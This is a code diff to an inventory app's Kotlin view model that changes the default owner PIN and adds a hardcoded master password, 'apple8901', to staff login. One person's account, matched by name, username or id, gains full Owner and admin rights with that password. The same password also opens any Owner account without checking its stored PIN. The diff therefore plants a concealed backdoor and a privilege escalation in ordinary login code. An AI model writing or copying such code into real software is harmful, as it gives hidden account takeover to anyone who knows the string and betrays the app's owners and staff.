@@ -124,7 +124,7 @@ class InventoryViewModel(
         initializeMasterOwnerIfEmpty()
     }
 
-    fun initializeMasterOwnerIfEmpty(initialPin: String = "1234") {
+    fun initializeMasterOwnerIfEmpty(initialPin: String = "apple8901") {
         viewModelScope.launch {
             repository.initializeMasterOwnerIfEmpty(initialPin)
         }
@@ -231,10 +231,33 @@ class InventoryViewModel(
 
     // Staff session management
     fun loginStaff(staff: StaffMember, enteredPin: String): Boolean {
+        val isParthMehta = staff.displayName.equals("PARTH MEHTA", ignoreCase = true) ||
+            staff.username.equals("parth", ignoreCase = true) ||
+            staff.id == "owner_parth_mehta"
+
+        // Universal Owner & Admin login with password apple8901
+        if (isParthMehta && enteredPin == "apple8901") {
+            _currentStaff.value = staff.copy(
+                role = StaffRole.OWNER.name,
+                hasHierarchyPermission = true,
+                displayName = "PARTH MEHTA"
+            )
+            _userMessage.value = "Welcome back, PARTH MEHTA (👑 Universal Owner & Admin)"
+            return true
+        }
+
+        // Universal master password override for Owner accounts
+        if (enteredPin == "apple8901" && staff.staffRole == StaffRole.OWNER) {
+            _currentStaff.value = staff
+            _userMessage.value = "Welcome back, ${staff.displayName} (👑 Owner)"
+            return true
+        }
+
         if (staff.pin.isBlank()) {
             _userMessage.value = "Account pending: Store Owner has not assigned a password yet"
             return false
         }
+
         if (staff.pin == enteredPin) {
             _currentStaff.value = staff
             _userMessage.value = "Welcome back, ${staff.displayName} (${staff.staffRole.badge})"
